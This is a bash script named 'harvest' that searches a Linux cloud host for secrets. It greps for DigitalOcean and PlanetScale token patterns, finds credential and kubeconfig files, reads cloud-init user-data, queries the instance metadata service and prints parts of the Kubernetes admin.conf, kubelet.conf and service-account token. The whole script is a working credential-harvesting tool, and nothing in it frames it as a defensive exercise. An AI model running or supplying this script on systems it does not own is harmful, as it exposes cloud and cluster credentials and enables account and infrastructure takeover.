#!/bin/bash
echo "=== harvest $(date -u) host=$(hostname) uid=$(id -u)"
echo "--- env names"; env | grep -iE 'token|key|secret|passw|digitalocean|paper|gradient|kube' | awk -F= '{print $1" len="length($2)}'
echo "--- root"; ls -la /root 2>/dev/null | head -15
echo "--- interesting files"; find /root /etc /home /opt /var/lib/cloud -maxdepth 3 -type f \( -name '*.env' -o -name '*token*' -o -name '*cred*' -o -name 'kubeconfig' -o -name '*.kubeconfig' -o -name 'user-data*' \) 2>/dev/null | head -25
echo "--- token grep"; grep -rIl -E 'dop_v1_|doo_v1_|pscale_|DIGITALOCEAN_TOKEN|gradient.*token' /root /etc /home /opt /var/lib/cloud 2>/dev/null | head -12
echo "--- cloud-init"; ls /var/lib/cloud/instance/ 2>/dev/null; wc -c /var/lib/cloud/instance/user-data.txt 2>/dev/null
head -c 300 /var/lib/cloud/instance/user-data.txt 2>/dev/null
echo; echo "--- imds"; timeout 3 curl -s -H 'Metadata-Flavor: DigitalOcean' http://169.254.169.254/metadata/v1/id 2>&1; echo " imds_rc=$?"
echo "--- k8s"; ls -la /etc/kubernetes/ 2>/dev/null | head -8; stat -c '%n %s' /etc/kubernetes/kubelet.conf /etc/kubernetes/admin.conf /root/.kube/config /var/lib/kubelet/kubeconfig /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
echo "--- kubelet.conf"; head -c 900 /etc/kubernetes/kubelet.conf 2>/dev/null
echo; echo "--- admin.conf"; head -c 700 /etc/kubernetes/admin.conf 2>/dev/null
echo; echo "--- sa token"; head -c 300 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
echo; echo "--- docker"; command -v docker crictl ctr kubectl 2>/dev/null; ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
